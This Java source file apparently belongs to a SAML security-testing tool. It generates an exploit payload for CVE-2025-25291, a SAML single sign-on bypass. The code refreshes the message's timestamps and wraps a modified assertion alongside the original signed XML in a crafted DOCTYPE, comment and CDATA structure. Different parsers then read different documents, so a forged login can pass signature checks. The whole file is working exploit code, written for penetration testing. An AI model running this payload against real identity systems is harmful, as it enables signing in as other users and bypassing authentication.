package helpers;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

/// Links:
/// * https://github.com/CompassSecurity/SAMLRaider/issues/93
/// * https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/
/// * https://portswigger.net/research/saml-roulette-the-hacker-always-wins
/// * https://github.com/d0ge/proof-of-concept-labs/tree/main/round-trip
public class CVE_2025_25291 {

    public static final String CVE = "CVE-2025-25291";

    private CVE_2025_25291() {
        // static class
    }

    public static String apply(String samlMessage) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        String now = getCurrentSAMLTime();
        String future = getFutureSAMLTime();
        // Replace all time attributes except AuthnInstant, as Ruby ignores it
        updateAttribute(document, "IssueInstant", now);
        updateAttribute(document, "NotBefore", now);
        updateAttribute(document, "NotOnOrAfter", future);
        updateAttribute(document, "SessionNotOnOrAfter", future);

        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);

        if (response == null) {
            throw new IllegalArgumentException("Missing <Response> element in SAML document.");
        }

        if (assertion == null) {
            throw new IllegalArgumentException("Missing <Assertion> element in SAML document.");
        }

        Element root = document.getDocumentElement();
        String endTag = root.getPrefix() != null
                ? "</" + root.getPrefix() + ":" + root.getLocalName() + ">"
                : "</" + root.getTagName() + ">";

        String xmlContent = xmlHelpers.getString(document, 4).trim().replaceFirst("^<\\?xml[^>]*\\?>\\s*", "");
        String[] parts = xmlContent.split(endTag);

        String originalXML = samlMessage.replaceFirst("^<\\?xml[^>]*\\?>\\s*", "");
        String[] originalParts = originalXML.split(endTag);

        if (parts.length != 1 || originalParts.length != 1) {
            throw new IllegalArgumentException("SAML document structure is invalid or contains multiple root elements.");
        }

        return "<!DOCTYPE response SYSTEM 'x\"><!--'>\n" +
                parts[0] +
                "<![CDATA[-->\n" +
                originalParts[0] +
                "<!--]]>-->\n" +
                endTag;
    }

    private static void updateAttribute(Document document, String attrName, String value) {
        NodeList allElements = document.getElementsByTagName("*");
        for (int i = 0; i < allElements.getLength(); i++) {
            Element el = (Element) allElements.item(i);
            if (el.hasAttribute(attrName)) {
                el.setAttribute(attrName, value);
            }
        }
    }

    private static String getCurrentSAMLTime() {
        return getFormattedSAMLTime(new Date());
    }

    private static String getFutureSAMLTime() {
        long now = System.currentTimeMillis();
        return getFormattedSAMLTime(new Date(now + 60 * 60 * 1000));
    }

    private static String getFormattedSAMLTime(Date date) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
        sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
        return sdf.format(date);
    }
}
